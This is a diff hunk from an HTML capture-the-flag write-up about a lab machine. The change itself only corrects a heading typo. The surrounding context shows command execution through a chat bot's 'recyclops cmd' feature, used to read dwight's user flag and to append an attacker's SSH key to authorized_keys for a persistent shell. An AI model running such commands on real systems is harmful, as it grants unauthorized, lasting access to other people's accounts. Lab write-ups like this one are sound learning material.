@@ -285,7 +285,7 @@ dwight
 </code></pre><p>We can use this to get the <code>user.txt</code> flag as a starting point with <code>recyclops cmd cat /home/dwight/user.txt</code>:</p>
 <pre><code> Running [cat /home/dwight/user.txt]...
 c1ff88de...
-</code></pre><h1 id="foothold--rfoot">Foothold &amp; <code>rfoot</code></h1>
+</code></pre><h1 id="foothold--root">Foothold &amp; <code>root</code></h1>
 <p>We can add our own public key into <code>dwight</code>&rsquo;s authorized keys with this and use that as a starting point:</p>
 <pre><code>recyclops cmd echo ssh-rsa &lt;key goes here&gt; &gt;&gt; /home/dwight/.ssh/authorized_keys
 </code></pre><p>And we&rsquo;re in with a stable shell.</p>
